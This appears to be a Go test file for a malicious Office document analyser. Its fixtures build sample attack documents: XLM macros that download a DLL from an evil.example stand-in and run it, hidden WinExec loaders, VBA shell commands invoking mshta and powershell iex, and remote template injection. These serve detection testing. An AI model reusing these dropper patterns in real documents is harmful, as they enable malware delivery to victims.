package maldoctrace

import (
	"archive/zip"
	"bytes"
	"context"
	"strings"
	"testing"

	"maldoctrace/extractor"
	"maldoctrace/internal/cfbtest"
	"maldoctrace/report"
)

func commandLines(r *report.Report) []string {
	var out []string
	for _, c := range r.Commands {
		out = append(out, c.CommandLine)
	}
	return out
}

func hasFinding(r *report.Report, kind string) bool {
	for _, f := range r.StaticFindings {
		if f.Kind == kind {
			return true
		}
	}
	return false
}

func hasIOC(r *report.Report, value string) bool {
	for _, i := range r.IOCs {
		if i.Value == value {
			return true
		}
	}
	return false
}

func TestXLMBinaryWorkbook(t *testing.T) {
	exec := `=EXEC("rundll32.exe C:\Users\Public\x.dll,DllRegisterServer")`
	data := cfbtest.MacroWorkbook("Macro1", true, 0, 0, "Enable content", []cfbtest.Formula{
		{Row: 0, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgStr("http://evil.example/p"), cfbtest.PtgStr("ayload.dll"), cfbtest.PtgConcat)},
		{Row: 1, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgStr("urlmon"), cfbtest.PtgStr("URLDownloadToFileA"), cfbtest.PtgStr("JJCCJJ"),
			cfbtest.PtgInt(0), cfbtest.PtgRef(0, 0), cfbtest.PtgStr(`C:\Users\Public\x.dll`), cfbtest.PtgInt(0), cfbtest.PtgInt(0), cfbtest.PtgFuncVar(8, 150))},
		{Row: 2, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgStr(exec), cfbtest.PtgRef(4, 0), cfbtest.PtgFuncVar(2, 0x8000|96))},
		{Row: 3, Col: 0, Rgce: cfbtest.Cat(cfbtest.PtgRef(4, 0), cfbtest.PtgFunc(53))},
		{Row: 5, Col: 0, Rgce: cfbtest.PtgFuncVar(0, 54)},
	})
	r := AnalyzeFromBytes(context.Background(), data, "xlm.xls", Options{})
	if r.Macros != "present" || len(r.MacroSheets) != 1 || len(r.MacroSheets[0].Formulas) != 5 {
		t.Fatalf("macros=%s sheets=%+v diags=%+v", r.Macros, r.MacroSheets, r.Diagnostics)
	}
	if len(r.EntryPoints) != 1 || r.EntryPoints[0].Module != "Macro1" || r.EntryPoints[0].Proc != "A1" {
		t.Fatalf("entry points = %+v", r.EntryPoints)
	}
	cmds := commandLines(r)
	if len(cmds) != 1 || cmds[0] != `rundll32.exe C:\Users\Public\x.dll,DllRegisterServer` || r.Commands[0].Method != "EXEC" {
		t.Fatalf("commands = %q", cmds)
	}
	if r.Commands[0].Source.Module != "Macro1" || r.Commands[0].Source.Proc != "A5" {
		t.Errorf("command source = %+v", r.Commands[0].Source)
	}
	download := false
	for _, e := range r.Events {
		if e.Type == "http_download" && e.Extra["url"] == "http://evil.example/payload.dll" {
			download = true
		}
	}
	if !download || !hasIOC(r, "http://evil.example/payload.dll") {
		t.Fatalf("download not recorded: events=%+v", r.Events)
	}
	if !hasFinding(r, "hidden_macrosheet") || !hasFinding(r, "xlm_auto_open") {
		t.Errorf("findings = %+v", r.StaticFindings)
	}
	written := false
	for _, d := range r.Decoded {
		if strings.HasPrefix(d.Method, "XLM FORMULA") && strings.HasPrefix(d.Value, "=EXEC(") && d.Proc == "A5" {
			written = true
		}
	}
	if !written {
		t.Errorf("FORMULA write not reported: %+v", r.Decoded)
	}
	text := report.RenderText(r)
	for _, want := range []string{"-- Excel 4.0 macro sheet \"Macro1\" (hidden, 5 formulas) --", "-- XLM formulas written at run time", "Macro1.A1  (XLM Auto_Open)"} {
		if !strings.Contains(text, want) {
			t.Errorf("text output lacks %q", want)
		}
	}
}

func xlsm(t *testing.T, sheetXML string) []byte {
	t.Helper()
	files := map[string]string{
		"[Content_Types].xml": `<Types/>`,
		"xl/workbook.xml": `<workbook xmlns:r="r"><sheets>
<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Sheet2" sheetId="2" state="veryHidden" r:id="rId2"/></sheets>
<definedNames><definedName name="_xlnm.Auto_Open" hidden="1">Sheet2!$A$1</definedName></definedNames></workbook>`,
		"xl/_rels/workbook.xml.rels": `<Relationships>
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1.xml"/></Relationships>`,
		"xl/worksheets/sheet1.xml":  `<worksheet><sheetData><row r="1"><c r="A1" t="s"><v>0</v></c></row></sheetData></worksheet>`,
		"xl/sharedStrings.xml":      `<sst><si><t>Please enable macros</t></si></sst>`,
		"xl/macrosheets/sheet1.xml": sheetXML,
	}
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	for n, b := range files {
		f, _ := w.Create(n)
		f.Write([]byte(b))
	}
	w.Close()
	return buf.Bytes()
}

func TestXLMOOXMLLoopAndRegister(t *testing.T) {
	cells := []struct{ ref, f, v string }{
		{"A1", `IF(GET.WORKSPACE(19),,CLOSE(TRUE))`, ""},
		{"A2", `SET.NAME("s","")`, ""},
		{"A3", `SET.NAME("i",1)`, ""},
		{"A4", `WHILE(i&lt;=4)`, ""},
		{"A5", `SET.NAME("s",s&amp;CHAR(OFFSET(B1,i-1,0)))`, ""},
		{"A6", `SET.NAME("i",i+1)`, ""},
		{"A7", `NEXT()`, ""},
		{"A8", `REGISTER("Kernel32","WinExec","JCJ","Run1",,1,9)`, ""},
		{"A9", `Run1(s&amp;".exe /c "&amp;MID("xxwhoami",3,6),0)`, ""},
		{"A10", `HALT()`, ""},
		{"B1", "", "99"}, {"B2", "", "109"}, {"B3", "", "100"}, {"B4", "", "46"},
	}
	var sx strings.Builder
	sx.WriteString(`<xm:macrosheet xmlns:xm="x"><sheetData><row>`)
	for _, c := range cells {
		sx.WriteString(`<c r="` + c.ref + `">`)
		if c.f != "" {
			sx.WriteString("<f>" + c.f + "</f>")
		}
		if c.v != "" {
			sx.WriteString("<v>" + c.v + "</v>")
		}
		sx.WriteString("</c>")
	}
	sx.WriteString(`</row></sheetData></xm:macrosheet>`)
	r := AnalyzeFromBytes(context.Background(), xlsm(t, sx.String()), "loop.xlsm", Options{})
	cmds := commandLines(r)
	if len(cmds) != 1 || cmds[0] != "cmd..exe /c whoami" {
		t.Fatalf("commands = %q\nevents=%+v\ndiags=%+v", cmds, r.Events, r.Diagnostics)
	}
	if r.Commands[0].Method != "WinExec" {
		t.Errorf("method = %s", r.Commands[0].Method)
	}
	if len(r.MacroSheets) != 1 || r.MacroSheets[0].Visibility != "very_hidden" {
		t.Errorf("macro sheets = %+v", r.MacroSheets)
	}
}

func TestVBAReadsCellsPropertiesAndVariables(t *testing.T) {
	code := `Sub AutoOpen()
    Shell Sheets("Data").Range("A1").Value
    Shell ActiveDocument.BuiltInDocumentProperties("Comments").Value
    CreateObject("WScript.Shell").Run ActiveDocument.Variables("v").Value
    Cells(2, 1) = "x"
    Shell "echo " & Worksheets(1).Cells(2, 1).Value
    ExecuteExcel4Macro "EXEC(""notepad.exe"")"
End Sub
`
	res := &extractor.Result{
		Format:  extractor.FormatCFB,
		Modules: []*extractor.Module{{Name: "Module1", FileName: "Module1.bas", TypeName: "procedural", Code: code}},
		Sheets:  []*extractor.Sheet{{Name: "Data", Kind: "worksheet", Visibility: "hidden", Cells: []extractor.Cell{{Row: 0, Col: 0, Value: "cmd /c whoami", ValueKind: "string"}}}},
		Properties: []extractor.DocProperty{
			{Name: "Comments", Value: "powershell -nop -c iex", Kind: "builtin"},
			{Name: "v", Value: "mshta http://evil.example/x.hta", Kind: "variable"},
		},
	}
	r := &report.Report{Status: "complete"}
	opts := Options{}
	opts.fill()
	runEmulation(context.Background(), res, r, opts)
	finalizeReport(r)
	want := []string{"cmd /c whoami", "powershell -nop -c iex", "mshta http://evil.example/x.hta", "echo x", "notepad.exe"}
	got := commandLines(r)
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Fatalf("commands = %q, want %q\ndiags=%+v", got, want, r.Diagnostics)
	}
}

func TestStompingDetection(t *testing.T) {
	lit := func(s string) []byte { return append([]byte{byte(len(s)), byte(len(s) >> 8)}, s...) }
	pcode := append(append([]byte{0x01, 0x02}, lit("powershell -w hidden -c iex")...), lit("hello")...)
	res := &extractor.Result{Modules: []*extractor.Module{
		{Name: "Stomped", Code: "Sub AutoOpen()\n    MsgBox \"hello\"\nEnd Sub\n", PCode: pcode},
		{Name: "Clean", Code: "Sub X()\n    MsgBox \"powershell -w hidden -c iex\" & \"hello\"\nEnd Sub\n", PCode: pcode},
	}}
	r := &report.Report{}
	staticAnalysis(res, r)
	if len(r.StaticFindings) != 1 {
		t.Fatalf("findings = %+v", r.StaticFindings)
	}
	f := r.StaticFindings[0]
	if f.Kind != "vba_stomping" || f.Location != "module Stomped" || len(f.Evidence) != 1 || f.Evidence[0] != "powershell -w hidden -c iex" {
		t.Fatalf("finding = %+v", f)
	}
}

func TestTemplateInjectionReport(t *testing.T) {
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	f, _ := w.Create("word/_rels/settings.xml.rels")
	f.Write([]byte(`<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>`))
	f, _ = w.Create("word/document.xml")
	f.Write([]byte(`<w:document xmlns:w="w"><w:body><w:p><w:r><w:t>Invoice</w:t></w:r></w:p></w:body></w:document>`))
	w.Close()
	r := AnalyzeFromBytes(context.Background(), buf.Bytes(), "t.docx", Options{})
	if r.Macros != "absent" || !hasFinding(r, "template_injection") || !hasIOC(r, "https://evil.example/t.dotm") {
		t.Fatalf("macros=%s findings=%+v iocs=%+v", r.Macros, r.StaticFindings, r.IOCs)
	}
	if !strings.Contains(report.RenderText(r), "[finding-1] template_injection (high)") {
		t.Error(report.RenderText(r))
	}
}
